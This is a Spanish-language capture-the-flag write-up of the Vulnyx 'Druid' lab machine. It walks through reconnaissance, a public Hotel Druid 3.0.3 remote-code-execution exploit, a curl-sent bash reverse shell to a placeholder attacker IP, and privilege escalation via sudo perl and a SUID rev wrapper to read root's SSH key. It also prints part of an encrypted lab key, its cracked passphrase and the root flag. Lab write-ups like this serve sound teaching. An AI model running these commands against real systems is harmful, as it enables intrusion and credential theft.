---
title: Vulnyx - Druid
author: estx
date: 2024-04-29 16:41:00 +0800
categories: [Writeup, Vulnyx, Easy]
tags: [Linux, 'Information Leakage', 'Local Port Forwarding']
math: true
mermaid: true
image:
  path: /assets/images/Vulnyx/Easy/Druid/logo.png
  lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
  alt: Hook Machine Logo
---

Máquina Linux de nivel **Easy** de Vulnyx.

Técnicas usadas: **Information Leakage, Local Port Forwarding**


### Fase de Reconocimiento 🧣

Como primer punto, identificamos la dirección IP de la **`Máquina Vulnyx`**

```bash
root@kali> arp-scan -I eth0 --local --ignoredups

<SNIP>
192.168.100.67	08:00:27:c6:4f:1d	PCS Systemtechnik GmbH
```

a. Enumeramos los puertos que están abiertos.

```bash
❯ nmap -p- -sS --min-rate 5000 -Pn -n 192.168.100.67 -oG ports

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

b. Vemos las versiones de los servicios que se están ejecutando

```bash
❯ nmap -p22,80 -sCV 192.168.100.67 -oN versions

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Hotel
```


c. Para conocer las tecnologías que se emplean en la página web, usaremos `whatweb`

```bash
❯ whatweb http://192.168.100.67/

http://192.168.100.67/ [200 OK] Apache[2.4.56], Bootstrap, Country[RESERVED][ZZ], Email[info@hotel.nyx], HTML5, HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[192.168.100.67], JQuery[3.3.1], Script, Title[Hotel], X-UA-Compatible[IE=edge]
```

* Lo más relevante que vemos es un dominio **`hotel.nyx`**, el cual añadiremos al archivo `/etc/hosts` ya que se está empleando **virtual hosting**

> **Virtual Hosting:** Se usa cuando un servidor web puedes 'hostear' múltiples dominios, de tal manera, que dependiendo de cual visites muestra cierto contenido.
{: .prompt-info }


```bash
❯ cat /etc/hosts
...
192.168.100.67 hotel.nyx
```

d. Ahora, realizaremos un **fuzzing de subdominios** 

```bash
❯ wfuzz -c -t 60 --hc=404 --hh=33065 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.hotel.nyx" http://hotel.nyx

...
000007108:   200        17 L     31 W       398 Ch      "reservations" 
```

* Este subdominio también lo añadimos al `/etc/hosts`

```bash
❯ cat /etc/hosts
...
192.168.100.67 hotel.nyx reservations.hotel.nyx
```

* Al visitar este subdominio veremos un sistema de administración y al ir configuración obtendremos la versión de este sistema

![Configuration](/assets/images/Vulnyx/Easy/Druid/01-config.png)

* Con esto buscaremos un exploit para esta versión de **Hotel Druid**

```bash
❯ searchsploit hotel druid 3.0.3
-----------------------------------------------------------------------------
Exploit Title                                        |  Path
-----------------------------------------------------------------------------
Hotel Druid 3.0.3 - Remote Code Execution (RCE)      |  php/webapps/50754.py
```

e. Inspeccionamos el script y lo ejecutamos 

```bash
❯ python rce_hoteldruid.py -t http://reservations.hotel.nyx/ --noauth
------------------------------------------------------------------------------------
❯ curl -s -X GET "http://reservations.hotel.nyx/dati/selectappartamenti.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

* Nos entablamos una reverse shell

```bash
❯ curl -s -X GET "http://reservations.hotel.nyx/dati/selectappartamenti.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/[IP Atacante]/4444%200>%261'"
------------------------------------------------------------------------------------
❯ nc -lvnp 4444
www-data@druid:/var/www/hoteldruid/dati$
```


### Escalada de Privilegios 💹

a. Ahora realizamos un tratamiento de la TTY en la reverse shell

```bash
www-data@druid:/var/www/hoteldruid/dati$ script /dev/null -c bash
www-data@druid:/var/www/hoteldruid/dati$ ^Z
[1]  + 8798 suspended  nc -lvnp 4444
❯ stty raw -echo;fg
[1]  + 8798 continued  nc -lvnp 4444
                                reset xterm

www-data@druid:/var/www/hoteldruid/dati$ export TERM=xterm-256color
www-data@druid:/var/www/hoteldruid/dati$ source /etc/skel/.bashrc
```

b. Revisamos los permisos a nivel de sudoers de este usuario

```bash
www-data@druid:/var/www/hoteldruid/dati$ sudo -l

User www-data may run the following commands on druid:
    (sun) NOPASSWD: /usr/bin/perl
```

* Ejecutamos un comando en **perl** para convertirnos en `sun`

```bash
www-data@druid:/var/www/hoteldruid/dati$ sudo -u sun /usr/bin/perl -e 'exec "/bin/bash";'
sun@druid:/var/www/hoteldruid/dati$ 
```

c. Vemos los binarios con permisos **SUID** 

```bash
sun@druid:/var/www/hoteldruid/dati$ find / -perm -4000 2>/dev/null
<SNIP>
/usr/bin/super
<SNIP>
```

* Este binario es inusual, y si lo investigamos llegamos a ver que nos permite ejecutar el comando `rev`

```bash
sun@druid:/var/www/hoteldruid/dati$ /usr/bin/super         
Command Name    Comments
or Pattern              
------------    --------
secret          
sun@druid:/var/www/hoteldruid/dati$ /usr/bin/super secret

sun@druid:/var/www/hoteldruid/dati$ /usr/bin/super secret --help
Usage: secret [options] [file ...]

Reverse lines characterwise.

Options:
 -h, --help     display this help
 -V, --version  display version

For more details see rev(1).
```

d. Con `rev` podemos llegar a leer archivos del sistema [GTFOBins](https://gtfobins.github.io/gtfobins/rev/#suid)


```bash
sun@druid:/var/www/hoteldruid/dati$ /usr/bin/super secret /root/.ssh/id_rsa | rev
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,7A064479BF5ABFB4

9LDgmvZhH9QGC3WjD688C/tnc8BvpehK7WlukWyvGDeWs/TyXD5R8AsiRzAi/pmB
altCR/yc+FWmkJKDiVxqycyqf7fYZkrHOwAoHve8uhYVq1SAE31mVrPqV+SahyRZ
<SNIP>
ehzp89ccR6fUz3S9iwcmcgnAIPnXmXpwqhLBqFy8O8Z9/7vcHyk44A==
-----END RSA PRIVATE KEY-----
```

* Esta clave **id_rsa** está encriptada, usaremos ssh2john para extraer el hash y tratar de crackearlo con john

```bash
❯ ssh2john id_rsa > hash-ssh
❯ john hash-ssh -w=/usr/share/wordlists/rockyou.txt

id_rsa:super1
```

e. Por último, le damos el permiso **600** a la id_rsa y nos podemos loguear como root

```bash
❯ ssh root@192.168.100.67 -i id_rsa
Enter passphrase for key 'id_rsa': 
root@druid:~# cat /root/root.txt 
1261b7a8c3b99b0daded8caca8b4023d
```